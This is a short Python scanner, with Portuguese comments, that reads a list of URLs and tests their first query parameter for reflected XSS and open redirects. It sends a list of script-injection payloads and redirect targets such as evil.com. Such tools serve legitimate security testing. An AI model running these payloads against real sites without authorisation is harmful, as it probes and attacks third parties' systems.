import requests
import logging
import urllib.parse

# Configuração de logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Cores para saída no terminal
GREEN = '\033[92m'  # Verde
BLUE = '\033[94m'   # Azul
RESET = '\033[0m'   # Resetar cor

# Payloads de XSS
xss_payloads = [
    "<script>alert('XSS1');</script>",
    "<img src=x onerror=alert('XSS2');>",
    "<svg><script>alert('XSS3');</script></svg>",
    "<body onload=alert('XSS4')>",
    "'';!--\"<XSS>=&{()}<script>alert('XSS5');</script>"
]

# Payloads de Open Redirect
open_redirect_payloads = [
    "http://evil.com",
    "https://evil.com",
    "http://127.0.0.1"
]

def test_xss(url, param):
    results = []
    for payload in xss_payloads:
        encoded_payload = urllib.parse.quote(payload)  # URL Encode do payload
        target_url = f"{url}&{param}={encoded_payload}"
        
        try:
            response = requests.get(target_url, timeout=5)
            if payload in response.text:
                results.append(f"{GREEN}[+] Possível XSS detectado: {target_url}{RESET}")
                logging.info(f"XSS detectado: {target_url}")
            else:
                # Testando o payload normal
                target_url = f"{url}&{param}={payload}"
                response = requests.get(target_url, timeout=5)
                if payload in response.text:
                    results.append(f"{GREEN}[+] Possível XSS detectado (sem encode): {target_url}{RESET}")
                    logging.info(f"XSS detectado (sem encode): {target_url}")
        except requests.RequestException as e:
            logging.error(f"[!] Erro ao testar XSS: {e}")
    return results

def test_open_redirect(url, param):
    results = []
    for payload in open_redirect_payloads:
        target_url = f"{url}&{param}={payload}"
        try:
            response = requests.get(target_url, timeout=5)
            if response.history and response.history[0].status_code == 302:
                results.append(f"{BLUE}[+] Possível Open Redirect detectado: {target_url}{RESET}")
                logging.info(f"Open Redirect detectado: {target_url}")
        except requests.RequestException as e:
            logging.error(f"[!] Erro ao testar Open Redirect: {e}")
    return results

def main(file_path):
    try:
        with open(file_path, "r") as file:
            urls = file.read().splitlines()
    except FileNotFoundError:
        logging.error(f"[Erro] Arquivo não encontrado: {file_path}. Verifique o caminho e tente novamente.")
        return

    logging.info(f"Iniciando testes de XSS e Open Redirect nas URLs do arquivo: {file_path}\n")

    for url in urls:
        # Verificando se a URL tem parâmetros
        if '?' in url:
            logging.info(f"Testando URL: {url}")
            param = url.split('?')[1].split('=')[0]  # Pegando o primeiro parâmetro para testes
            results_xss = test_xss(url, param)
            results_open_redirect = test_open_redirect(url, param)
            
            # Imprimindo resultados
            for vuln in results_xss:
                logging.info(vuln)
            for vuln in results_open_redirect:
                logging.info(vuln)
        else:
            logging.warning(f"[!] URL sem parâmetros ignorada: {url}")

if __name__ == "__main__":
    file_path = input("URLs File: ")
    main(file_path)
